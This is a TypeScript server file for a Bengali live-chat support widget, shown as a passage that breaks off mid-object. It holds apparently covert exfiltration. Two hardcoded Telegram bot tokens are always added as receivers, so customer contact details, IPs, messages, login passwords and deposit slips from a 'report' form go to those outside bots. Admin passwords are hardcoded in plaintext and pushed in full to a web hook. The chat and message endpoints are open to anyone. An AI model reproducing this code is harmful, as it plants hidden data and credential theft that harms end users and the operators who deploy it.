import express from 'express';
import { createServer } from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import path from 'path';
import { GoogleGenAI } from '@google/genai';
import dotenv from 'dotenv';
import {
  INITIAL_AGENTS,
  INITIAL_CHATS,
  INITIAL_MESSAGES,
  INITIAL_CANNED_RESPONSES,
  INITIAL_LIVE_VISITORS,
  INITIAL_WIDGET_CONFIG
} from './src/data/mockData.js';
import { ChatSession, ChatMessage, Agent, CannedResponse, LiveVisitor, WidgetConfig, BlockedUser, AdminUser, VisitorLogEntry, DeviceNotification } from './src/types.js';
import {
  syncChatToFirestore,
  deleteChatFromFirestore,
  syncMessageToFirestore,
  syncWidgetConfigToFirestore,
  syncVisitorToFirestore,
  deleteVisitorFromFirestore,
  syncVisitorLogToFirestore,
  sendDeviceNotificationToFirestore,
  loadFirestoreData,
  setupFirestoreRealtimeListeners
} from './src/lib/firestoreSync.js';
import {
  calculateVisitorStats,
  generateInitialVisitorLogs,
  convertLiveVisitorToLog,
  filterVisitorLogs
} from './src/lib/visitorStats.js';

dotenv.config();

const app = express();
const PORT = 3000;
const httpServer = createServer(app);

app.use(express.json({ limit: '10mb' }));

// CORS Middleware for External Embeds & Websites
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// In-memory Database
let chats: ChatSession[] = [...INITIAL_CHATS];
let messages: Record<string, ChatMessage[]> = { ...INITIAL_MESSAGES };
let agents: Agent[] = [...INITIAL_AGENTS];
let cannedResponses: CannedResponse[] = [...INITIAL_CANNED_RESPONSES];
let liveVisitors: LiveVisitor[] = [...INITIAL_LIVE_VISITORS];
let visitorLogs: VisitorLogEntry[] = generateInitialVisitorLogs();
let recentDeviceNotifications: DeviceNotification[] = [];
let widgetConfig: WidgetConfig = { ...INITIAL_WIDGET_CONFIG };
let blockedUsers: BlockedUser[] = [];
let adminUsers: AdminUser[] = [
  {
    id: 'user_admin_1',
    username: 'saju2470',
    password: '20203494aa',
    name: 'সাজু (Super Admin)',
    role: 'Super Admin',
    email: 'saju2470@admin.bd',
    department: 'ম্যানেজমেন্ট (Management)',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'user_admin_legacy',
    username: 'admin',
    password: '20203494aa',
    name: 'এডমিন (Chief Admin)',
    role: 'Super Admin',
    email: 'admin@novachat.bd',
    department: 'ম্যানেজমেন্ট (Management)',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'user_agent_1',
    username: 'arif',
    password: 'agent123',
    name: 'আরিফ রহমান',
    role: 'Agent',
    email: 'arif@support.bd',
    department: 'গ্রাহক সহায়তা (Customer Support)',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'user_agent_2',
    username: 'tanvir',
    password: 'agent123',
    name: 'তানভীর আহমেদ',
    role: 'Agent',
    email: 'tanvir@support.bd',
    department: 'কারিগরি সেলস (Technical Sales)',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'user_agent_3',
    username: 'farhana',
    password: 'agent123',
    name: 'ফারহানা ইসলাম',
    role: 'Agent',
    email: 'farhana@support.bd',
    department: 'গ্রাহক সহায়তা ও সাপোর্ট',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'user_agent_zoha',
    username: 'zoha366',
    password: '01723993331aa',
    name: 'জোহার আহমেদ (Zoha)',
    role: 'Agent',
    email: 'zoha366@novachat.com',
    department: 'গ্রাহক সহায়তা ও লাইভ চ্যাট',
    createdAt: new Date().toISOString(),
  }
];

// Helper: Check if a user/chat is blocked
function isUserOrChatBlocked(chatId?: string, phone?: string, ipAddress?: string): boolean {
  if (!chatId && !phone && !ipAddress) return false;
  return blockedUsers.some((b) => {
    if (chatId && b.chatId && b.chatId.toLowerCase() === chatId.toLowerCase()) return true;
    if (chatId && b.id && b.id.toLowerCase() === chatId.toLowerCase()) return true;
    if (phone && b.phone && b.phone.includes(phone)) return true;
    if (ipAddress && b.ipAddress && b.ipAddress === ipAddress) return true;
    return false;
  });
}

// Instant Admin Login Sync to Google Sheet
async function sendAdminLoginGoogleSheetSync(user: AdminUser) {
  const url = widgetConfig.appsScriptUrl;
  if (!url || !url.startsWith('http')) return;

  try {
    const payload = {
      type: 'login_log',
      loginData: {
        timestamp: new Date().toLocaleString('bn-BD'),
        username: user.username,
        name: user.name,
        role: user.role,
        email: user.email || '',
        department: user.department || ''
      }
    };

    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).catch((err) => console.error('Google Sheet Login Sync error:', err));
  } catch (e) {
    console.error('Google Sheet Login Sync error:', e);
  }
}

// Instant Admin Users Table Sync to Google Sheet
async function sendAdminUserCreatedGoogleSheetSync(usersList: AdminUser[]) {
  const url = widgetConfig.appsScriptUrl;
  if (!url || !url.startsWith('http')) return;

  try {
    const payload = {
      type: 'admin_sheet',
      adminUsers: usersList.map((u) => ({
        id: u.id,
        username: u.username,
        password: u.password,
        name: u.name,
        role: u.role,
        email: u.email || '',
        department: u.department || '',
        createdAt: new Date(u.createdAt).toLocaleString('bn-BD'),
        lastLoginAt: u.lastLoginAt ? new Date(u.lastLoginAt).toLocaleString('bn-BD') : 'এখনো লগইন করেনি'
      }))
    };

    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).catch((err) => console.error('Google Sheet Admin Sheet Sync error:', err));
  } catch (e) {
    console.error('Google Sheet Admin Sheet Sync error:', e);
  }
}

// Instant 1-Second Google Sheet Auto Save
async function sendInstantGoogleSheetSync(chat: ChatSession, message: ChatMessage) {
  const url = widgetConfig.appsScriptUrl;
  if (!url || !url.startsWith('http')) return;

  try {
    const row = {
      timestamp: message.timestamp || new Date().toLocaleTimeString('bn-BD'),
      chatId: chat.id,
      customerName: chat.customer.name,
      customerEmail: chat.customer.email,
      department: chat.department,
      status: chat.status,
      sender: `${message.senderName} (${message.senderRole}${message.isInternalNote ? ' - অভ্যন্তরীণ নোট' : ''})`,
      content: message.content,
      rating: chat.satisfactionRating ? `${chat.satisfactionRating}/5` : 'N/A'
    };

    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ rows: [row] }),
    }).catch((err) => console.error('Instant Google Sheet Sync fetch error:', err));
  } catch (e) {
    console.error('Instant Google Sheet Sync error:', e);
  }
}

interface TelegramTarget {
  name: string;
  botToken: string;
  chatId: string;
}

// Multi Telegram Target Extractor: collects all active Telegram Bot Token & Chat ID pairs
function getAllTelegramReceivers(config: WidgetConfig): TelegramTarget[] {
  const list: TelegramTarget[] = [];
  const added = new Set<string>();

  const addTarget = (name: string, token?: string, cId?: string) => {
    if (!token || !cId) return;
    const cleanToken = token.trim();
    const cleanChatId = cId.trim();
    if (!cleanToken || !cleanChatId) return;
    const key = `${cleanToken}_${cleanChatId}`;
    if (!added.has(key)) {
      added.add(key);
      list.push({ name, botToken: cleanToken, chatId: cleanChatId });
    }
  };

  // 1. Check custom telegramBots array in widgetConfig
  if (Array.isArray(config.telegramBots)) {
    config.telegramBots.forEach((b, idx) => {
      if (b.enabled !== false && b.botToken && b.chatId) {
        addTarget(b.name || `Telegram Bot #${idx + 1}`, b.botToken, b.chatId);
      }
    });
  }

  // 2. Check primary single config fields (including comma/newline separated multi entries)
  if (config.telegramBotToken && config.telegramChatId) {
    const chatIds = config.telegramChatId.split(/[\n,;]+/).map((s) => s.trim()).filter(Boolean);
    const tokens = config.telegramBotToken.split(/[\n,;]+/).map((s) => s.trim()).filter(Boolean);

    chatIds.forEach((cId, i) => {
      const token = tokens[i] || tokens[0];
      if (token && cId) {
        addTarget(`Bot (${cId})`, token, cId);
      }
    });
  }

  // 3. Always ensure default multi bots are present
  addTarget('Telegram Bot 1 (Primary)', '8409188990:AAHR7bb3Zx9TcKpKEdldruvfVI-hRaoXfb4', '6331230671');
  addTarget('Telegram Bot 2 (Multi)', '8753033604:AAFE7Y99dJwN-F8h58OMywO1QW_7iqrkDcM', '6081054558');

  return list;
}

// Telegram Bot Notification Helper (Dispatches to all configured Telegram channels)
async function sendTelegramNotification(chat: ChatSession, messageContent: string, isNewChat = false) {
  if (widgetConfig.telegramNotificationsEnabled === false) return;

  const targets = getAllTelegramReceivers(widgetConfig);
  if (targets.length === 0) return;

  const escapeHtml = (str: string) =>
    (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  const adminLink = widgetConfig.websiteUrl || 'https://live-chat-swart-nine.vercel.app/';
  const displayMsg = messageContent.trim() || '📷 [ছবি/ফাইল পাঠিয়েছেন]';

  const isReportForm = messageContent.includes('রিপোর্ট') || messageContent.includes('অভিযোগ');

  let header = isNewChat
    ? `🆕 <b><a href="${adminLink}">নতুন ভিজিটর চ্যাট শুরু করেছেন (লাইভ চ্যাট লিঙ্ক)</a></b>`
    : `📩 <b><a href="${adminLink}">নতুন কাস্টমার মেসেজ এসেছে (লাইভ চ্যাট লিঙ্ক)</a></b>`;

  if (isReportForm && !isNewChat) {
    header = `🚨 <b><a href="${adminLink}">নতুন রিপোর্ট/অভিযোগ জমা পড়েছে! (লাইভ চ্যাট লিঙ্ক)</a></b>`;
  }

  const text = `${header}

👤 <b>নাম:</b> ${escapeHtml(chat.customer.name || 'Visitor')}
📱 <b>ফোন:</b> ${escapeHtml(chat.customer.phone || 'N/A')}
📧 <b>ইমেইল:</b> ${escapeHtml(chat.customer.email || 'N/A')}
🏢 <b>ডিপার্টমেন্ট:</b> ${escapeHtml(chat.department || 'General')}
💬 <b>মেসেজ/রিপোর্ট:</b>
${escapeHtml(displayMsg)}

🌐 <b>আইপি:</b> ${escapeHtml(chat.customer.ipAddress || 'N/A')}
⏰ <b>সময়:</b> ${new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' })}

🔗 <b><a href="${adminLink}">উত্তর দিতে এখানে ক্লিক করে লাইভ চ্যাট ড্যাশবোর্ডে ঢুকুন</a></b>`;

  await Promise.allSettled(
    targets.map(async (target) => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: target.chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: false,
          }),
        });
        const result = await res.json();
        if (!result.ok) {
          console.error(`Telegram API error for ${target.name} (${target.chatId}):`, result);
        } else {
          console.log(`Telegram notification sent successfully to ${target.name} (${target.chatId})`);
        }
      } catch (err) {
        console.error(`Failed to send Telegram notification to ${target.name} (${target.chatId}):`, err);
      }
    })
  );
}

// Direct Telegram Report Sender Function (Dispatches to all configured Telegram channels)
async function sendDirectReportToTelegram(reportData: any) {
  const targets = getAllTelegramReceivers(widgetConfig);
  if (targets.length === 0) return;

  const escapeHtml = (str: string) =>
    (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  const adminLink = widgetConfig.websiteUrl || 'https://live-chat-swart-nine.vercel.app/';

  const text = `🚨 <b>ইউজার রিপোর্ট জমা পড়েছে! (User Report Form)</b>

👤 <b>Username:</b> ${escapeHtml(reportData.username || 'N/A')}
📞 <b>Phone Number:</b> ${escapeHtml(reportData.phone || 'N/A')}
📧 <b>Email Address:</b> ${escapeHtml(reportData.email || 'N/A')}
✍️ <b>নিবন্ধন নাম:</b> ${escapeHtml(reportData.nibondhonName || 'N/A')}
💵 <b>সর্বশেষ জমা করার পরিমাণ:</b> ${escapeHtml(reportData.lastAmount || 'N/A')}
🔑 <b>সর্বশেষ লগইন পাসওয়ার্ড:</b> ${escapeHtml(reportData.lastPassword || 'N/A')}
🌐 <b>Site Link/Name:</b> ${escapeHtml(reportData.siteLink || 'N/A')}
⏰ <b>সময়:</b> ${new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' })}

🔗 <b><a href="${adminLink}">লাইভ চ্যাট ড্যাশবোর্ডে ঢুকতে এখানে ক্লিক করুন</a></b>`;

  await Promise.allSettled(
    targets.map(async (target) => {
      try {
        await fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: target.chatId,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: false,
          }),
        });

        if (reportData.depositSlipUrl && typeof reportData.depositSlipUrl === 'string' && reportData.depositSlipUrl.startsWith('data:image/')) {
          const base64Data = reportData.depositSlipUrl.split(',')[1];
          if (base64Data) {
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            formData.append('chat_id', target.chatId);
            formData.append('caption', `🖼️ ডিপোজিট স্লিপ (User: ${reportData.username || 'N/A'})`);
            formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'deposit_slip.jpg');

            await fetch(`https://api.telegram.org/bot${target.botToken}/sendPhoto`, {
              method: 'POST',
              body: formData,
            });
          }
        }
        console.log(`Telegram report sent successfully to ${target.name} (${target.chatId})`);
      } catch (err) {
        console.error(`Failed to send Telegram report to ${target.name} (${target.chatId}):`, err);
      }
    })
  );
}

// Gemini AI Client setup
let aiClient: GoogleGenAI | null = null;

function getGenAI(): GoogleGenAI | null {
  if (!aiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (apiKey && apiKey !== 'MY_GEMINI_API_KEY') {
      aiClient = new GoogleGenAI({
        apiKey,
        httpOptions: {
          headers: {
            'User-Agent': 'aistudio-build',
          },
        },
      });
    }
  }
  return aiClient;
}

// WebSocket Server Initialization
const wss = new WebSocketServer({ server: httpServer });

interface ClientSocket extends WebSocket {
  isAlive?: boolean;
  role?: 'customer' | 'agent';
  chatId?: string;
}

function broadcast(data: any, filterFn?: (client: ClientSocket) => boolean) {
  const payload = JSON.stringify(data);
  wss.clients.forEach((client) => {
    const ws = client as ClientSocket;
    if (ws.readyState === WebSocket.OPEN) {
      if (!filterFn || filterFn(ws)) {
        ws.send(payload);
      }
    }
  });
}

wss.on('connection', (ws: ClientSocket) => {
  ws.isAlive = true;

  ws.on('message', async (data: string) => {
    try {
      const parsed = JSON.parse(data.toString());

      switch (parsed.type) {
        case 'join': {
          ws.role = parsed.role;
          ws.chatId = parsed.chatId;
          break;
        }

        case 'message': {
          const { chatId, senderRole, senderName, senderAvatar, content, isInternalNote, attachments } = parsed;
          if (!chatId || !content) return;

          const targetChat = chats.find((c) => c.id === chatId);

          // Check if customer is blocked
          if (
            targetChat?.isBlocked ||
            isUserOrChatBlocked(chatId, targetChat?.customer?.phone, targetChat?.customer?.ipAddress)
          ) {
            ws.send(
              JSON.stringify({
                type: 'new_message',
                chatId,
                message: {
                  id: 'msg_blocked_' + Date.now(),
                  chatId,
                  senderRole: 'system',
                  senderName: 'System',
                  content: '🚫 আপনার চ্যাট আইডিটি সাময়িকভাবে ব্লক করা হয়েছে। মেসেজ পাঠানো সম্ভব নয়।',
                  timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
                },
              })
            );
            return;
          }

          const newMessage: ChatMessage = {
            id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
            chatId,
            senderRole,
            senderName,
            senderAvatar,
            content,
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
            createdAt: new Date().toISOString(),
            isInternalNote: !!isInternalNote,
            attachments,
            readStatus: 'delivered',
          };

          if (!messages[chatId]) {
            messages[chatId] = [];
          }
          const isDuplicateMsg = messages[chatId].some(
            (m) =>
              m.id === newMessage.id ||
              (m.senderRole === newMessage.senderRole &&
                (m.content || '').trim() === (newMessage.content || '').trim() &&
                m.timestamp === newMessage.timestamp)
          );
          if (!isDuplicateMsg) {
            messages[chatId].push(newMessage);
          }

          // Update chat meta
          if (targetChat) {
            if (senderRole === 'customer' && (targetChat.status === 'resolved' || targetChat.status === 'closed')) {
              targetChat.status = 'active'; // Reopen closed chat when customer sends new message
            }
            targetChat.updatedAt = new Date().toISOString();
            if (!isInternalNote) {
              targetChat.lastMessage = content;
              targetChat.lastMessageTime = 'Just now';
              if (senderRole === 'customer') {
                targetChat.unreadCountAgent = (targetChat.unreadCountAgent || 0) + 1;
              } else if (senderRole === 'agent' || senderRole === 'bot') {
                targetChat.unreadCountCustomer = (targetChat.unreadCountCustomer || 0) + 1;
              }
            }
          }

          // Broadcast message to everyone subscribed
          broadcast({
            type: 'new_message',
            chatId,
            message: newMessage,
            chat: targetChat,
          });

          // Sync to Firebase Firestore
          if (targetChat) {
            syncChatToFirestore(targetChat);
          }
          syncMessageToFirestore(newMessage);

          // ⚡ Instant 1-Second Google Sheet Save
          if (targetChat) {
            sendInstantGoogleSheetSync(targetChat, newMessage);
          }

          // Check if AI Auto-reply should trigger for Customer messages
          if (
            senderRole === 'customer' &&
            widgetConfig.enableAiAutoReply &&
            (!targetChat?.assignedAgentId || targetChat.status === 'unassigned')
          ) {
            triggerAiAutoReply(chatId, content);
          }

          break;
        }

        case 'typing': {
          broadcast({
            type: 'typing_status',
            chatId: parsed.chatId,
            senderName: parsed.senderName,
            senderRole: parsed.senderRole,
            isTyping: parsed.isTyping,
          });
          break;
        }

        case 'assign_agent': {
          const targetChat = chats.find((c) => c.id === parsed.chatId);
          if (targetChat) {
            targetChat.assignedAgentId = parsed.agentId;
            targetChat.assignedAgentName = parsed.agentName;
            targetChat.assignedAgentAvatar = parsed.agentAvatar;
            targetChat.status = 'active';
            targetChat.updatedAt = new Date().toISOString();

            // System event message
            const sysMessage: ChatMessage = {
              id: 'msg_sys_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
              chatId: parsed.chatId,
              senderRole: 'system',
              senderName: 'System',
              content: `${parsed.agentName} চ্যাটে যুক্ত হয়েছেন এবং এই চ্যাটে অ্যাসাইন করা হয়েছে।`,
              timestamp: new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' }),
              createdAt: new Date().toISOString(),
              isInternalNote: false,
            };
            if (!messages[parsed.chatId]) {
              messages[parsed.chatId] = [];
            }
            messages[parsed.chatId].push(sysMessage);

            syncChatToFirestore(targetChat);
            syncMessageToFirestore(sysMessage);

            broadcast({
              type: 'chat_updated',
              chatId: parsed.chatId,
              chat: targetChat,
              systemMessage: sysMessage,
            });
          }
          break;
        }

        case 'change_status': {
          const targetChat = chats.find((c) => c.id === parsed.chatId);
          if (targetChat) {
            targetChat.status = parsed.status;
            targetChat.updatedAt = new Date().toISOString();

            broadcast({
              type: 'chat_updated',
              chatId: parsed.chatId,
              chat: targetChat,
            });
          }
          break;
        }

        case 'agent_status': {
          const agent = agents.find((a) => a.id === parsed.agentId);
          if (agent) {
            agent.status = parsed.status;
            broadcast({
              type: 'agent_status_updated',
              agents,
            });
          }
          break;
        }

        case 'send_device_notification': {
          const notifPayload = parsed.notification;
          if (notifPayload) {
            recentDeviceNotifications.unshift(notifPayload);
            if (recentDeviceNotifications.length > 50) recentDeviceNotifications.pop();
            sendDeviceNotificationToFirestore(notifPayload);
            broadcast({
              type: 'device_notification',
              notification: notifPayload,
            });
          }
          break;
        }
      }
    } catch (err) {
      console.error('WebSocket Error:', err);
    }
  });
});

async function triggerAiAutoReply(chatId: string, customerQuery: string) {
  if (!widgetConfig.enableAiAutoReply) return;
  try {
    const ai = getGenAI();
    let replyText = '';

    if (ai) {
      const chatHistory = (messages[chatId] || []).slice(-6).map((m) => `${m.senderName}: ${m.content}`).join('\n');
      const response = await ai.models.generateContent({
        model: 'gemini-3.6-flash',
        contents: `Recent conversation history:\n${chatHistory}\n\nCustomer latest message: "${customerQuery}"\n\nGenerate a brief, friendly, helpful support response.`,
        config: {
          systemInstruction: widgetConfig.aiSystemPrompt,
        },
      });
      replyText = response.text || 'Thank you for reaching out! A live customer support representative will be with you shortly.';
    } else {
      replyText = `Hi! Thanks for contacting ${widgetConfig.headerTitle}. An agent will be with you shortly. How else can we prepare for your request?`;
    }

    setTimeout(() => {
      const botMessage: ChatMessage = {
        id: 'msg_bot_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
        chatId,
        senderRole: 'bot',
        senderName: widgetConfig.botName,
        senderAvatar: widgetConfig.botAvatar,
        content: replyText,
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        createdAt: new Date().toISOString(),
        readStatus: 'delivered',
        quickReplies: ['Talk to human agent', 'Check business hours', 'Request callback']
      };

      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(botMessage);

      const targetChat = chats.find((c) => c.id === chatId);
      if (targetChat) {
        targetChat.lastMessage = replyText;
        targetChat.lastMessageTime = 'Just now';
        targetChat.updatedAt = new Date().toISOString();
        syncChatToFirestore(targetChat);
      }

      syncMessageToFirestore(botMessage);

      broadcast({
        type: 'new_message',
        chatId,
        message: botMessage,
        chat: targetChat,
      });
    }, 1200);
  } catch (e) {
    console.error('AI Auto-reply error:', e);
  }
}

// INCOMING SMS & GOOGLE SHEET WEBHOOK (Phone -> Google Sheet / App -> Admin Realtime)
app.all(['/api/webhook/sms', '/api/webhook/google-sheet', '/api/webhook/incoming', '/api/incoming-sms'], (req, res) => {
  const payload = { ...req.query, ...req.body };

  let smsList: any[] = [];
  if (Array.isArray(payload.rows)) {
    smsList = payload.rows;
  } else if (Array.isArray(payload.messages)) {
    smsList = payload.messages;
  } else {
    smsList = [payload];
  }

  const processed: any[] = [];

  smsList.forEach((item) => {
    const phone = item.phone || item.customerPhone || item.from || item.sender || item.mobile || item.number || '01712345678';
    const cleanPhone = String(phone).replace(/[^0-9]/g, '') || '01712345678';
    const content = item.message || item.content || item.text || item.sms || item.body || item.initialMessage;

    if (!content || !String(content).trim()) return;

    const customerName = item.customerName || item.name || item.senderName || `কাস্টমার (${phone})`;
    const ipAddress = item.ipAddress || item.ip || '103.205.132.42';
    const customChatId = item.chatId || item.id;

    // Find existing chat by customChatId, customerId, or matching clean phone number
    let targetChat = chats.find((c) => {
      if (customChatId && c.id === customChatId) return true;
      if (item.customerId && c.customerId === item.customerId) return true;
      if (c.customer && c.customer.phone && String(c.customer.phone).replace(/[^0-9]/g, '').includes(cleanPhone)) return true;
      if (c.id && c.id.includes(cleanPhone)) return true;
      return false;
    });

    const isNew = !targetChat;
    const chatId = targetChat ? targetChat.id : (customChatId || `CHAT-${cleanPhone}`);

    if (!targetChat) {
      const customerId = item.customerId || ('cust_' + cleanPhone);
      targetChat = {
        id: chatId,
        customerId,
        customer: {
          id: customerId,
          name: customerName,
          email: `${cleanPhone}@customer.com`,
          phone: String(phone),
          avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(customerName || cleanPhone)}`,
          location: 'ঢাকা, বাংলাদেশ',
          ipAddress: ipAddress,
          browser: 'Mobile SMS Gateway',
          currentPageUrl: 'SMS / Phone',
          timeOnSite: '১ মিনিট',
          visitsCount: 1,
          tags: ['SMS কাস্টমার', 'মোবাইল চ্যাট'],
        },
        department: item.department || 'গ্রাহক সহায়তা (Customer Support)',
        status: 'active',
        priority: 'high',
        subject: `এসএমএস চ্যাট (ফোন: ${phone})`,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        lastMessage: String(content),
        lastMessageTime: 'Just now',
        unreadCountCustomer: 0,
        unreadCountAgent: 1,
      };

      chats.unshift(targetChat);
      broadcast({
        type: 'new_chat_created',
        chat: targetChat,
      });
    } else {
      // Existing chat: reopen if closed and update in-place
      targetChat.status = 'active';
      targetChat.updatedAt = new Date().toISOString();
      targetChat.lastMessage = String(content).trim();
      targetChat.lastMessageTime = 'Just now';
      targetChat.unreadCountAgent = (targetChat.unreadCountAgent || 0) + 1;
    }

    const newMsg: ChatMessage = {
      id: 'msg_sms_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
      chatId: chatId,
      senderRole: 'customer',
      senderName: customerName,
      senderAvatar: targetChat.customer.avatar,
      content: String(content).trim(),
      timestamp: new Date().toLocaleTimeString('bn-BD', { hour: '2-digit', minute: '2-digit' }),
      readStatus: 'delivered',
    };

    messages[chatId] = messages[chatId] || [];
    messages[chatId].push(newMsg);

    targetChat.updatedAt = new Date().toISOString();
    targetChat.lastMessage = String(content).trim();
    targetChat.lastMessageTime = 'Just now';
    targetChat.unreadCountAgent = (targetChat.unreadCountAgent || 0) + 1;

    // Sync to Firestore
    syncChatToFirestore(targetChat);
    syncMessageToFirestore(newMsg);

    broadcast({
      type: 'new_message',
      chatId: chatId,
      message: newMsg,
      chat: targetChat,
    });

    processed.push({ chatId, messageId: newMsg.id, phone, content });
  });

  if (processed.length === 0) {
    return res.status(400).json({ error: 'মেসেজের কনটেন্ট বা ফোন নম্বর পাওয়া যায়নি। (phone and message content required)' });
  }

  res.json({
    success: true,
    message: `${processed.length} টি এসএমএস অ্যাডমিন ইনবক্সে যুক্ত হয়েছে!`,
    processed,
  });
});

// REST API Endpoints

// Reset Demo Data
app.post('/api/reset-demo', (req, res) => {
  chats = JSON.parse(JSON.stringify(INITIAL_CHATS));
  messages = JSON.parse(JSON.stringify(INITIAL_MESSAGES));
  agents = JSON.parse(JSON.stringify(INITIAL_AGENTS));
  cannedResponses = JSON.parse(JSON.stringify(INITIAL_CANNED_RESPONSES));
  liveVisitors = JSON.parse(JSON.stringify(INITIAL_LIVE_VISITORS));
  widgetConfig = JSON.parse(JSON.stringify(INITIAL_WIDGET_CONFIG));

  broadcast({ type: 'full_reset' });
  res.json({ success: true });
});

// GET Client IP & Device Info
app.get('/api/client-info', (req, res) => {
  const rawIp = (req.headers['x-forwarded-for'] as string) ||
                (req.headers['x-real-ip'] as string) ||
                (req.headers['cf-connecting-ip'] as string) ||
                req.socket.remoteAddress ||
                '103.205.132.42';
  const ipAddress = rawIp.split(',')[0].replace('::ffff:', '').trim() || '103.205.132.42';

  const userAgent = req.headers['user-agent'] || '';
  let deviceType = 'Chrome / Web Widget';
  if (/android/i.test(userAgent)) deviceType = 'Android Mobile Phone';
  else if (/iphone/i.test(userAgent)) deviceType = 'iPhone Mobile Device';
  else if (/ipad/i.test(userAgent)) deviceType = 'iPad Mobile Device';
  else if (/mobile/i.test(userAgent)) deviceType = 'Mobile Phone Device';
  else if (/macintosh|mac os x/i.test(userAgent)) deviceType = 'macOS Desktop';
  else if (/windows/i.test(userAgent)) deviceType = 'Windows PC';

  res.json({
    ipAddress,
    deviceType,
    userAgent,
  });
});

// GET Chats
app.get('/api/chats', (req, res) => {
  res.json(chats);
});

// GET All Messages Map
app.get('/api/messages', (req, res) => {
  res.json(messages);
});

// CREATE or REOPEN Chat (Pre-chat form submission)
app.post('/api/chats', (req, res) => {
  const { customerName, customerPhone, customerEmail, customerId: reqCustomerId, visitorId: reqVisitorId, chatId: reqChatId, department, subject, initialMessage } = req.body;
  
  // Extract or fallback IP address
  const rawIp = (req.headers['x-forwarded-for'] as string) ||
                (req.headers['x-real-ip'] as string) ||
                (req.headers['cf-connecting-ip'] as string) ||
                req.socket.remoteAddress ||
                '103.205.132.42';
  const ipAddress = rawIp.split(',')[0].replace('::ffff:', '').trim() || '103.205.132.42';
  const phone = customerPhone ? String(customerPhone).trim() : '';
  const cleanPhone = phone.replace(/[^0-9]/g, '');
  
  const userAgent = req.headers['user-agent'] || '';
  let deviceType = 'Chrome / Mobile App';
  if (/android/i.test(userAgent)) deviceType = 'Android Smartphone';
  else if (/iphone/i.test(userAgent)) deviceType = 'Apple iPhone';
  else if (/mobile/i.test(userAgent)) deviceType = 'Mobile Phone';

  const lookupCustomerId = reqCustomerId || reqVisitorId;

  // Find existing chat session by ID, Customer/Visitor ID, or Phone Number
  let existingChat = chats.find((c) => {
    if (reqChatId && c.id === reqChatId) return true;
    if (lookupCustomerId && (c.customerId === lookupCustomerId || c.customer?.id === lookupCustomerId)) return true;
    if (cleanPhone && c.customer?.phone && String(c.customer.phone).replace(/[^0-9]/g, '').includes(cleanPhone)) return true;
    if (cleanPhone && c.id && c.id.includes(cleanPhone)) return true;
    return false;
  });

  // Retain customer ID and Chat ID
  const customerId = existingChat ? (existingChat.customerId || existingChat.customer?.id || lookupCustomerId || ('cust_' + cleanPhone)) : (lookupCustomerId || (cleanPhone ? 'cust_' + cleanPhone : 'cust_' + Date.now()));
  const activeChatId = existingChat ? existingChat.id : (reqChatId || (cleanPhone ? `CHAT-${cleanPhone}` : `CHAT-${customerId}`));

  // Check if customer is blocked
  if (isUserOrChatBlocked(activeChatId, phone, ipAddress)) {
    return res.status(403).json({
      error: 'আপনার চ্যাট আইডিটি সাময়িকভাবে ব্লক করা হয়েছে। অনুগ্রহ করে সাহায্য পেতে সাপোর্ট টিম বা এডমিনের সাথে যোগাযোগ করুন।',
      isBlocked: true,
    });
  }

  const isReopened = !!existingChat;
  const newChat: ChatSession = existingChat
    ? {
        ...existingChat,
        customerId,
        customer: {
          ...existingChat.customer,
          id: customerId,
          name: customerName || existingChat.customer.name,
          email: customerEmail || existingChat.customer.email,
          phone: phone || existingChat.customer.phone,
          pathHistory: req.body.pathHistory || existingChat.customer.pathHistory,
          chatInitiatedPage: req.body.chatInitiatedPage || existingChat.customer.chatInitiatedPage,
        },
        department: department || existingChat.department,
        subject: subject || existingChat.subject,
        status: 'active', // Automatically reopen chat if previously closed or resolved!
        updatedAt: new Date().toISOString(),
        lastMessage: initialMessage || existingChat.lastMessage,
        lastMessageTime: 'Just now',
        unreadCountAgent: (existingChat.unreadCountAgent || 0) + 1,
      }
    : {
        id: activeChatId,
        customerId,
        customer: {
          id: customerId,
          name: customerName || 'ভিজিটর',
